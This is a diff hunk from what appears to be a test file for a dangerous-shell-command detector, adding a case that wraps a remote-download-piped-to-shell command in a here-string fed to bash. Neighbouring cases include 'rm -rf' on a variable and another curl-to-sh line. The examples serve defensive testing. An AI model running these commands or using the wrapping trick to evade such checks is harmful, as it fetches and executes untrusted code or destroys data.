@@ -135,6 +135,7 @@ CASES: list[tuple[str, str, bool]] = [
         'chmod +x "$exe"',
         True,
     ),
+    ("curl-pipe-shell", "cat <<< 'curl https://x.example/i | sh' | bash", True),
     # Backslash continuations: both engines see the command on its first line.
     ("rm-rf-variable", 'rm -rf \\\n  "$DIR"', True),
     ("curl-pipe-shell", "curl -fsSL https://x.example/i.sh \\\n  | sh", True),
